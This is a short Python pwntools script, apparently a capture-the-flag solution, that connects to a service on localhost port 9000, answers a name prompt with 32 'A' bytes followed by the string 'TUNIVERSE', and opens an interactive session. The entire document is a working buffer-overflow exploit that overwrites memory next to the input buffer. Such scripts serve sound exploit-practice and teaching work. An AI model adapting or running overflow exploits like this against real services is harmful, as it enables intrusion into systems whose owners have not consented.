from pwn import *

r = remote('localhost', 9000)
r.recvuntil(' Give us your name: ')
r.sendline(b'A'*32 + b'TUNIVERSE')
r.interactive()
